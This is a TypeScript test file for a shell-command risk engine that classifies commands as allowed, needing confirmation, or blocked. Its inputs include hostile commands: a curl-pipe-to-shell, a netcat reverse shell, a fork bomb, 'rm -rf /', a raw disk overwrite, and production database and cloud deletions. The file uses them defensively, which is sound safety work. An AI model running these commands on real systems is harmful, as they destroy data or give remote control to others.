import { describe, expect, it } from "vitest";
import { isSetuidMode, isWorldWritableMode } from "../../src/rules/permissions.rules";
import { cfg, judge } from "../fixtures/helpers";
import blocked from "../fixtures/blocked-commands.json";
import risky from "../fixtures/risky-commands.json";
import safe from "../fixtures/safe-commands.json";

const ids = (c: string | string[], config = cfg(), env?: NodeJS.ProcessEnv) => judge(c, config, env).findings.map((f) => f.ruleId);

describe("ruleEngine: fixture tables", () => {
  it.each(safe.map((s) => [s.command]))("safe: %s is allowed", (command) => {
    const r = judge(command);
    expect(r.policy.decision).toBe("ALLOW");
    expect(r.policy.risk).toBe("LOW");
  });

  it.each(risky.map((r) => [r.command, r.risk, r.decision, r.rules] as const))("risky: %s -> %s/%s", (command, risk, decision, rules) => {
    const r = judge(command);
    expect(r.policy.risk).toBe(risk);
    expect(r.policy.decision).toBe(decision);
    for (const id of rules) expect(r.findings.map((f) => f.ruleId)).toContain(id);
  });

  it.each(blocked.map((b) => [b.command, b.rules] as const))("blocked: %s", (command, rules) => {
    const r = judge(command);
    expect(r.policy.decision).toBe("BLOCK");
    expect(r.policy.risk).toBe("CRITICAL");
    for (const id of rules) expect(r.findings.map((f) => f.ruleId)).toContain(id);
  });
});

describe("ruleEngine: targeted behaviour", () => {
  it("is deterministic", () => {
    const a = JSON.stringify(judge("sudo chmod -R 777 /var/www").findings);
    const b = JSON.stringify(judge("sudo chmod -R 777 /var/www").findings);
    expect(a).toBe(b);
  });

  it("sorts findings by descending risk", () => {
    const f = judge("sudo rm -rf /").findings;
    for (let i = 1; i < f.length; i++) {
      const order = { LOW: 0, MEDIUM: 1, HIGH: 2, CRITICAL: 3 } as const;
      expect(order[f[i - 1].risk]).toBeGreaterThanOrEqual(order[f[i].risk]);
    }
  });

  it("does not confuse a local script named rm with a quoted argument", () => {
    expect(ids(["echo", "rm -rf /"])).not.toContain("FS_ROOT_DELETE");
  });

  it("rm in argv mode is still analysed", () => {
    expect(judge(["rm", "-rf", "/"]).policy.decision).toBe("BLOCK");
  });

  it("flags rm -rf with an empty-able variable", () => {
    expect(ids('rm -rf "$DIR/"')).toContain("FS_UNRESOLVED_TARGET");
  });

  it("treats $HOME deletion as critical", () => {
    expect(judge("rm -rf $HOME").policy.decision).toBe("BLOCK");
    expect(judge("rm -rf ${HOME}/").policy.decision).toBe("BLOCK");
  });

  it("rm -rf of a project subdirectory is HIGH/CONFIRM, not blocked", () => {
    const r = judge("rm -rf ./build");
    expect(r.policy.decision).toBe("CONFIRM");
  });

  it("protected directories are hard-blocked for every modifying command", () => {
    for (const c of [
      "rm /srv/protected/a.txt",
      "mv /srv/protected/a /tmp/a",
      "cp x /srv/protected/y",
      "chmod 600 /srv/protected/a",
      "echo x > /srv/protected/a",
      "tee /srv/protected/a",
      "sed -i s/a/b/ /srv/protected/f",
      "find /srv/protected -delete",
      "truncate -s 0 /srv/protected/f",
    ]) {
      const r = judge(c);
      expect(r.policy.decision, c).toBe("BLOCK");
      expect(r.policy.blockedBy, c).toContain("FS_PROTECTED_TARGET");
    }
  });

  it("reading from a protected directory is allowed", () => {
    expect(judge("cat /srv/protected/a.txt").policy.decision).toBe("ALLOW");
    expect(judge("cp /srv/protected/a.txt /tmp/a.txt").policy.decision).not.toBe("BLOCK");
  });

  it("detects relative paths that resolve into a protected directory", () => {
    expect(judge("rm /srv/other/../protected/x").policy.decision).toBe("BLOCK");
  });

  it("detects deletion of an ancestor of a protected directory", () => {
    expect(judge("rm -rf /srv").policy.blockedBy).toContain("FS_PROTECTED_TARGET");
  });

  it("find -delete from root is critical", () => {
    expect(judge("find / -name x -delete").policy.decision).toBe("BLOCK");
  });

  it("find without -delete or -exec is harmless", () => {
    expect(judge("find . -name '*.ts' -type f").policy.decision).toBe("ALLOW");
  });

  it("chmod mode helpers", () => {
    expect(isWorldWritableMode("777")).toBe(true);
    expect(isWorldWritableMode("0666")).toBe(true);
    expect(isWorldWritableMode("755")).toBe(false);
    expect(isWorldWritableMode("o+w")).toBe(true);
    expect(isWorldWritableMode("a=rwx")).toBe(true);
    expect(isWorldWritableMode("u+w")).toBe(false);
    expect(isWorldWritableMode("o-w")).toBe(false);
    expect(isSetuidMode("4755")).toBe(true);
    expect(isSetuidMode("u+s")).toBe(true);
    expect(isSetuidMode("755")).toBe(false);
  });

  it("chmod -x style modes are not mistaken for flags", () => {
    expect(judge("chmod -x script.sh").policy.decision).toBe("ALLOW");
  });

  it("git: safe forms are allowed, history rewriting is not", () => {
    expect(judge("git push origin feature").policy.decision).toBe("ALLOW");
    expect(ids("git push --force origin feature")).toContain("GIT_FORCE_PUSH");
    expect(ids("git push origin +main")).toContain("GIT_FORCE_PUSH");
    expect(ids("git push --delete origin old")).toContain("GIT_DELETE_REMOTE_BRANCH");
    expect(ids("git -C /repo reset --hard")).toContain("GIT_HARD_RESET");
    expect(ids("git clean -fdx")[0]).toBe("GIT_CLEAN");
    expect(ids("git clean --dry-run -fd")).not.toContain("GIT_CLEAN");
    expect(ids("git checkout .")).toContain("GIT_DISCARD_CHANGES");
    expect(ids("git stash drop")).toContain("GIT_STASH_DROP");
    expect(ids("git filter-branch --all")).toContain("GIT_FILTER_HISTORY");
    expect(ids("git branch -D old")).toContain("GIT_DELETE_BRANCH_FORCE");
  });

  it("database: SQL patterns", () => {
    expect(ids('psql -c "DROP DATABASE app"')).toContain("DB_DROP_DATABASE");
    expect(ids('psql -c "update t set a=1"')).toContain("DB_UPDATE_NO_WHERE");
    expect(ids('psql -c "update t set a=1 where id=2"')).not.toContain("DB_UPDATE_NO_WHERE");
    expect(ids('mongosh --eval "db.users.deleteMany({})"')).toContain("DB_MONGO_DROP");
    expect(judge('psql -c "select * from t"').policy.decision).toBe("ALLOW");
  });

  it("database: production host from explicit flag, URL or environment", () => {
    expect(ids("psql postgres://u:p@prod-db.example.com/app -c 'select 1'")).toContain("DB_PRODUCTION_CONNECT");
    expect(ids("psql -c 'select 1'", cfg(), { HOME: "/home/dev", PGHOST: "prod-db.example.com" })).toContain("DB_PRODUCTION_CONNECT");
    // explicit -h localhost overrides PGHOST, so the environment is ignored
    expect(ids("psql -h localhost -c 'select 1'", cfg(), { HOME: "/home/dev", PGHOST: "prod-db.example.com" })).not.toContain("DB_PRODUCTION_CONNECT");
  });

  it("database: production writes are blocked, production reads need confirmation", () => {
    expect(judge('psql -h prod-db.example.com -c "UPDATE t SET a=1 WHERE id=1"').policy.decision).toBe("BLOCK");
    expect(judge('psql -h prod-db.example.com -c "select 1"').policy.decision).toBe("CONFIRM");
    expect(judge("pg_dump -h prod-db.example.com app").policy.decision).toBe("CONFIRM");
  });

  it("database: migrations in production", () => {
    expect(judge("NODE_ENV=production npx prisma migrate deploy").policy.decision).toBe("CONFIRM");
    expect(judge("RAILS_ENV=production rails db:drop").policy.decision).toBe("BLOCK");
    expect(judge("npx prisma migrate dev").policy.decision).toBe("WARN");
  });

  it("cloud: kubeconfig current-context production is enforced via environment", () => {
    const base = judge("kubectl delete pod x");
    expect(base.policy.decision).toBe("CONFIRM");
  });

  it("cloud: terraform in production workspace", () => {
    expect(judge("TF_WORKSPACE=production terraform apply -auto-approve").policy.decision).toBe("BLOCK");
    expect(judge("TF_WORKSPACE=staging terraform destroy").policy.decision).toBe("CONFIRM");
    expect(judge("TF_WORKSPACE=production terraform plan").policy.decision).toBe("ALLOW");
  });

  it("cloud: AWS account IDs and profiles", () => {
    expect(judge("aws s3 rm s3://b --recursive --profile prod").policy.decision).toBe("BLOCK");
    expect(judge("aws ec2 terminate-instances --role-arn arn:aws:iam::123456789012:role/x").policy.decision).toBe("BLOCK");
    expect(judge("aws ec2 describe-instances --profile prod").policy.decision).toBe("ALLOW");
  });

  it("network: pipe-to-shell and reverse shells", () => {
    expect(ids("curl https://x.invalid | sh")).toContain("NET_PIPE_TO_SHELL");
    expect(ids("curl https://x.invalid | jq .")).not.toContain("NET_PIPE_TO_SHELL");
    expect(judge("nc -e /bin/sh 1.2.3.4 9").policy.decision).toBe("BLOCK");
    expect(ids("curl -k https://x.invalid")).toContain("NET_INSECURE_TLS");
  });

  it("process: fork bomb, shutdown, crontab -r", () => {
    expect(judge(":(){ :|:& };:").policy.decision).toBe("BLOCK");
    expect(ids("reboot")).toContain("PROC_SHUTDOWN");
    expect(ids("sudo systemctl poweroff")).toContain("PROC_SHUTDOWN");
    expect(ids("crontab -r")).toContain("PROC_CRONTAB_REMOVE");
  });

  it("privilege: sudo escalates, root shells are HIGH", () => {
    expect(ids("sudo ls")).toContain("PRIV_ELEVATED");
    expect(ids("sudo bash")).toContain("PRIV_ROOT_SHELL");
    expect(ids("sudo bash -c 'ls'")).not.toContain("PRIV_ROOT_SHELL");
  });

  it("redirections: overwrite warns, system files and devices escalate", () => {
    expect(ids("echo x > out.txt")).toContain("FS_OVERWRITE_REDIRECT");
    expect(ids("echo x >> out.txt")).not.toContain("FS_OVERWRITE_REDIRECT");
    expect(ids("echo x > /etc/hosts")).toContain("FS_SYSTEM_FILE_WRITE");
    expect(judge("cat x > /dev/sda").policy.decision).toBe("BLOCK");
    expect(ids("make 2>&1 | tee build.log")).not.toContain("FS_OVERWRITE_REDIRECT");
  });

  it("uncertain syntax warns rather than allows", () => {
    expect(judge("echo $(date)").policy.decision).toBe("WARN");
    expect(judge("cat <<EOF\nhi\nEOF").policy.uncertain).toBe(true);
  });
});
